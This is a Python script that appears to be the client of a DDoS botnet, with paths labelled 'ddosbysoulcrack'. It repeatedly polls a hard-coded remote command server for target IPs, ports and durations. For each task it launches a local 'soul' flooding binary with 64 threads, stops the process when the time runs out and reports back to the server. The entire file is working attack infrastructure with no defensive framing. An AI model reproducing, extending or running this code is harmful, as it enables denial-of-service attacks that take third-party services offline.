import requests
import subprocess
import time
import os
import sys

BASE_URL = 'http://13.60.29.63:3001'
SOUL_PATH = '/shubhamddosbysoulcrack/'
DONE_PATH = '/shubhamddosbysoulcrack/done'

active_tasks = {}

def process_new_task(added):
    ip = added.get('ip')
    port = added.get('port')
    time_val = added.get('time')

    if ip and port and time_val:
        key = f"{ip}:{port}:{time_val}"
        if key not in active_tasks:
            print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}")
            try:
                # Check which binary exists
                if os.path.exists('./soul'):
                    # ALWAYS use 64 threads (4th parameter)
                    cmd = ['./soul', ip, port, time_val, '64']
                elif os.path.exists('soul.exe'):
                    cmd = ['soul.exe', ip, port, time_val, '64']
                else:
                    print(f"[!] ERROR: 'soul' binary not found!")
                    print(f"[!] Current directory: {os.getcwd()}")
                    return
                
                print(f"[+] Executing: {' '.join(cmd)}")
                process = subprocess.Popen(cmd)
                print(f"[+] Launched attack with 64 threads (PID: {process.pid})")
                
                active_tasks[key] = {
                    'process': process,
                    'time_left': int(time_val),
                    'ip': ip,
                    'port': port,
                    'time_val': time_val,
                    'pid': process.pid
                }
                
            except Exception as e:
                print(f"[!] Failed to launch attack: {e}")
                import traceback
                traceback.print_exc()
        else:
            print(f"[*] Task already running: {key}")
    else:
        print("[!] Invalid task data received")

def main_loop():
    print("[*] Soul.py started - Polling API for tasks...")
    print(f"[*] API URL: {BASE_URL}{SOUL_PATH}")
    print(f"[*] Will always use 64 threads for attacks")
    
    while True:
        try:
            # 1. Fetch tasks from API
            response = requests.get(f'{BASE_URL}{SOUL_PATH}', timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                # Process tasks
                if isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict):
                            if item.get('success') and 'added' in item:
                                process_new_task(item['added'])
                            elif 'added' in item:
                                process_new_task(item['added'])
                elif isinstance(data, dict):
                    if data.get('success') and 'added' in data:
                        process_new_task(data['added'])
                    elif 'added' in data:
                        process_new_task(data['added'])
            
            # 2. Update active tasks countdown
            keys_to_remove = []
            
            for key in list(active_tasks.keys()):
                task_info = active_tasks[key]
                
                # Check if process is still running
                if task_info['process'].poll() is not None:
                    print(f"[*] Process {task_info['pid']} completed for: {key}")
                    keys_to_remove.append(key)
                    continue
                
                # Decrease time
                task_info['time_left'] -= 1
                
                # Check if time expired
                if task_info['time_left'] <= 0:
                    ip = task_info['ip']
                    port = task_info['port']
                    time_val = task_info['time_val']
                    
                    print(f"[+] Time expired: {ip}:{port} for {time_val}s")
                    
                    # Terminate process
                    try:
                        task_info['process'].terminate()
                        print(f"[+] Terminated process {task_info['pid']}")
                    except:
                        pass
                    
                    # Notify API
                    try:
                        del_resp = requests.get(
                            f'{BASE_URL}{DONE_PATH}',
                            params={'ip': ip, 'port': port, 'time': time_val},
                            timeout=5
                        )
                        if del_resp.status_code == 200:
                            print(f"[+] API notified")
                    except Exception as e:
                        print(f"[!] Failed to notify API: {e}")
                    
                    keys_to_remove.append(key)
            
            # Remove completed tasks
            for key in keys_to_remove:
                if key in active_tasks:
                    del active_tasks[key]
            
            # Print status every 10 seconds
            if int(time.time()) % 10 == 0:
                print(f"[*] Status: {len(active_tasks)} active attacks")
            
            time.sleep(1)
            
        except requests.RequestException as e:
            print(f"[!] Network error: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Error: {e}")
            import traceback
            traceback.print_exc()
            time.sleep(2)

if __name__ == '__main__':
    main_loop()